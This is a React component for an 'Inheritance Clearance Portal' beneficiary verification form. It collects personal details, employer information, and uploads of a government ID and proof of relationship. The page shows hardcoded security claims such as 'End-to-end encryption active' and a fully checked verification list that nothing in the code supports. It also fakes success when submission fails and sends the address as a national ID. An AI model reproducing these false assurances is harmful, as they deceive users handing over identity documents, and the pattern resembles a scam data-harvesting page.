"use client"

import type React from "react"
import { FileText, CheckCircle } from "lucide-react"
import { useState, useEffect } from "react"
import { createBeneficiary } from "@/lib/api"

interface BeneficiaryVerificationProps {
  onNext: () => void
}

export default function BeneficiaryVerification({ onNext }: BeneficiaryVerificationProps) {
  const [submitted, setSubmitted] = useState(false)
  const [formData, setFormData] = useState({
    fullName: "",
    contactAddress: "",
    dateOfBirth: "",
    occupation: "",
    employer: "",
    position: "",
    phone: "",
    email: "",
  })

  // Prefill from initial form localStorage
  useEffect(() => {
    try {
      const saved = localStorage.getItem("initialFormData")
      if (saved) {
        const data = JSON.parse(saved)
        setFormData((prev) => ({
          ...prev,
          // map fields from initial form
          fullName: data.fullName || prev.fullName,
          contactAddress: data.address || prev.contactAddress,
          dateOfBirth: data.dateOfBirth || prev.dateOfBirth,
          phone: data.phone || prev.phone,
          email: data.email || prev.email,
        }))
      }
    } catch {
      // ignore
    }
  }, [])

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    const { name, value } = e.target
    setFormData((prev) => ({ ...prev, [name]: value }))
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    try {
      await createBeneficiary({
        name: formData.fullName,
        nationalId: formData.contactAddress || "A123456789",
        phone: formData.phone,
        email: formData.email,
      })
    } catch {}
    setSubmitted(true)
    setTimeout(() => {
      onNext()
    }, 2000)
  }

  if (submitted) {
    return (
      <div className="min-h-screen bg-white flex flex-col items-center justify-center px-6">
        <div className="text-center max-w-md">
          <div className="mb-6 flex justify-center">
            <CheckCircle className="w-16 h-16 text-[#CDAA4A]" />
          </div>
          <h1 className="text-3xl font-bold text-[#0C1B33] mb-4">Verification Submitted</h1>
          <p className="text-gray-600">Your verification has been submitted for clearance review.</p>
          <p className="text-sm text-gray-500 mt-2">Redirecting...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header */}
      <div className="bg-[#0C1B33] text-white py-8 px-6">
        <div className="max-w-4xl mx-auto">
          <h1 className="text-3xl font-bold">Beneficiary Verification</h1>
          <p className="text-gray-300 mt-2">Complete verification for inheritance clearance</p>
        </div>
      </div>

      {/* Form Content */}
      <div className="flex-1 px-6 py-12">
        <div className="max-w-4xl mx-auto">
          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Personal Information Section */}
            <div className="bg-white border-2 border-[#ECECEC] rounded-lg p-8">
              <h2 className="text-xl font-bold text-[#0C1B33] mb-6">Personal Information</h2>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <FormField
                  label="Full Name"
                  name="fullName"
                  value={formData.fullName}
                  onChange={handleInputChange}
                  required
                />
                <FormField
                  label="Contact Address"
                  name="contactAddress"
                  value={formData.contactAddress}
                  onChange={handleInputChange}
                  required
                />
                <FormField
                  label="Date of Birth"
                  name="dateOfBirth"
                  type="date"
                  value={formData.dateOfBirth}
                  onChange={handleInputChange}
                  required
                />
                <FormField
                  label="Occupation"
                  name="occupation"
                  value={formData.occupation}
                  onChange={handleInputChange}
                  required
                />
              </div>
            </div>

            {/* Employment Information Section */}
            <div className="bg-white border-2 border-[#ECECEC] rounded-lg p-8">
              <h2 className="text-xl font-bold text-[#0C1B33] mb-6">Employment Information</h2>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <FormField
                  label="Employer / Workplace"
                  name="employer"
                  value={formData.employer}
                  onChange={handleInputChange}
                  required
                />
                <FormField
                  label="Position / Title"
                  name="position"
                  value={formData.position}
                  onChange={handleInputChange}
                  required
                />
              </div>
            </div>

            {/* Contact Information Section */}
            <div className="bg-white border-2 border-[#ECECEC] rounded-lg p-8">
              <h2 className="text-xl font-bold text-[#0C1B33] mb-6">Contact Information</h2>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <FormField
                  label="Phone Number"
                  name="phone"
                  type="tel"
                  value={formData.phone}
                  onChange={handleInputChange}
                  required
                />
                <FormField
                  label="Email Address"
                  name="email"
                  type="email"
                  value={formData.email}
                  onChange={handleInputChange}
                  required
                />
              </div>
            </div>

            {/* Document Upload Section */}
            <div className="bg-white border-2 border-[#ECECEC] rounded-lg p-8">
              <h2 className="text-xl font-bold text-[#0C1B33] mb-6">Required Documentation</h2>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <UploadField label="Government ID Upload" accept=".pdf,.jpg,.png" />
                <UploadField label="Proof of Relationship Upload" accept=".pdf,.jpg,.png" />
              </div>
            </div>

            {/* Verification Checklist Section */}
            <div className="bg-white border-2 border-[#ECECEC] rounded-lg p-8">
              <h2 className="text-xl font-bold text-[#0C1B33] mb-6">Verification Checklist</h2>
              <div className="space-y-4">
                <ChecklistItem text="Personal information submitted and verified" />
                <ChecklistItem text="Proof of relationship document received" />
                <ChecklistItem text="National ID or passport verified" />
                <ChecklistItem text="Legal representation confirmed" />
                <ChecklistItem text="Banking information secured and encrypted" />
              </div>
            </div>

            {/* Security Notice */}
            <div className="bg-[#F5F5F5] border-l-4 border-[#CDAA4A] p-6 rounded">
              <p className="text-sm text-[#0C1B33] font-semibold mb-2">Security Status</p>
              <ul className="text-sm text-gray-700 space-y-1">
                <li>✔ End-to-end encryption active</li>
                <li>✔ Data compliance verified</li>
                <li>✔ Secure document storage confirmed</li>
              </ul>
            </div>

            {/* Action Buttons */}
            <div className="flex gap-4 pt-6">
              <button
                type="submit"
                className="flex-1 bg-[#0C1B33] hover:bg-[#1a2a47] text-white font-bold py-4 px-6 rounded-lg transition duration-200"
              >
                Confirm & Continue
              </button>
            </div>
          </form>
        </div>
      </div>

      {/* Footer */}
      <footer className="border-t border-[#ECECEC] bg-white px-6 py-8">
        <div className="max-w-4xl mx-auto text-center text-sm text-gray-600">
          <p>© 2025 Inheritance Clearance Portal. All rights reserved. Confidential communications.</p>
        </div>
      </footer>
    </div>
  )
}

interface FormFieldProps {
  label: string
  name: string
  value: string
  onChange: (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => void
  type?: string
  required?: boolean
}

function FormField({ label, name, value, onChange, type = "text", required = false }: FormFieldProps) {
  return (
    <div>
      <label htmlFor={name} className="block text-sm font-semibold text-[#0C1B33] mb-3">
        {label} {required && <span className="text-red-500">*</span>}
      </label>
      <input
        type={type}
        id={name}
        name={name}
        value={value}
        onChange={onChange}
        required={required}
        className="w-full px-4 py-3 border-2 border-[#D4D4D4] rounded-lg focus:outline-none focus:border-[#0C1B33] focus:ring-2 focus:ring-[#E8D9B5] bg-white text-[#0C1B33] placeholder-gray-400"
        placeholder={`Enter your ${label.toLowerCase()}`}
      />
    </div>
  )
}

interface UploadFieldProps {
  label: string
  accept?: string
}

function UploadField({ label, accept = ".pdf,.jpg,.png" }: UploadFieldProps) {
  const [fileName, setFileName] = useState<string | null>(null)

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (file) {
      setFileName(file.name)
    }
  }

  return (
    <div>
      <label className="block text-sm font-semibold text-[#0C1B33] mb-3">
        {label} <span className="text-red-500">*</span>
      </label>
      <div className="relative border-2 border-dashed border-[#D4D4D4] rounded-lg p-6 hover:border-[#0C1B33] transition cursor-pointer text-center">
        <input
          type="file"
          accept={accept}
          required
          onChange={handleFileChange}
          className="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
        />
        <FileText className="w-6 h-6 text-[#CDAA4A] mx-auto mb-2" />
        <p className="text-sm font-semibold text-[#0C1B33]">{fileName ? `Uploaded: ${fileName}` : "Click to upload"}</p>
        <p className="text-xs text-gray-500 mt-1">PDF, JPG, or PNG</p>
      </div>
    </div>
  )
}

function ChecklistItem({ text }: { text: string }) {
  return (
    <div className="flex items-center gap-3 p-3 bg-[#FAFAFA] rounded border border-[#ECECEC]">
      <span className="text-[#CDAA4A] font-bold text-lg">✓</span>
      <span className="text-gray-700">{text}</span>
    </div>
  )
}
